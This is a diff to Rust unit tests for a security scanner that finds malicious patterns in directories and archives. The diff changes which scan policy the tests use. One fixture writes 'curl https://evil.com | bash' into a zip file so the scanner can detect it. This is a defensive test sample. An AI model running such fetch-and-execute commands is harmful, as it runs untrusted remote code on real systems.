@@ -1928,6 +1928,12 @@ mod tests {
     use crate::security::policy::ScanPolicy;
     use tempfile::tempdir;
 
+    fn policy_with_structure_validation() -> ScanPolicy {
+        let mut policy = ScanPolicy::builtin_default().clone();
+        policy.strict_structure_enabled = true;
+        policy
+    }
+
     #[test]
     fn test_hard_trigger_patterns() {
         let scanner = SecurityScanner::new();
@@ -2712,10 +2718,14 @@ eval(user_input)
         .unwrap();
 
         let scanner = SecurityScanner::new();
-        let options =
-            ScanOptions::with_policy(crate::security::policy::ScanPolicy::builtin_strict().clone());
         let report = scanner
-            .scan_directory_with_options(dir.path().to_str().unwrap(), "test", "en", options, None)
+            .scan_directory_with_options(
+                dir.path().to_str().unwrap(),
+                "test",
+                "en",
+                ScanOptions::default(),
+                None,
+            )
             .unwrap();
 
         let trigger_issues: Vec<_> = report
@@ -2773,10 +2783,8 @@ eval(user_input)
         .unwrap();
         std::fs::write(dir.path().join("malware.exe"), "MZ...").unwrap();
 
-        // 使用 strict 策略启用结构校验
         let scanner = SecurityScanner::new();
-        let options =
-            ScanOptions::with_policy(crate::security::policy::ScanPolicy::builtin_strict().clone());
+        let options = ScanOptions::with_policy(policy_with_structure_validation());
         let report = scanner
             .scan_directory_with_options(dir.path().to_str().unwrap(), "test", "en", options, None)
             .unwrap();
@@ -3534,12 +3542,15 @@ subprocess.run(
         zip.write_all(b"curl https://evil.com | bash\n").unwrap();
         zip.finish().unwrap();
 
-        // 使用 strict 策略启用归档深度扫描
         let scanner = SecurityScanner::new();
-        let options =
-            ScanOptions::with_policy(crate::security::policy::ScanPolicy::builtin_strict().clone());
         let report = scanner
-            .scan_directory_with_options(dir.path().to_str().unwrap(), "test", "en", options, None)
+            .scan_directory_with_options(
+                dir.path().to_str().unwrap(),
+                "test",
+                "en",
+                ScanOptions::default(),
+                None,
+            )
             .unwrap();
 
         // 应该检测到 ZIP 内容中的 curl|sh
@@ -3605,10 +3616,14 @@ subprocess.run(
         zip.finish().unwrap();
 
         let scanner = SecurityScanner::new();
-        let options =
-            ScanOptions::with_policy(crate::security::policy::ScanPolicy::builtin_strict().clone());
         let report = scanner
-            .scan_directory_with_options(dir.path().to_str().unwrap(), "test", "en", options, None)
+            .scan_directory_with_options(
+                dir.path().to_str().unwrap(),
+                "test",
+                "en",
+                ScanOptions::default(),
+                None,
+            )
             .unwrap();
 
         // 应该检出路径穿越并 blocked
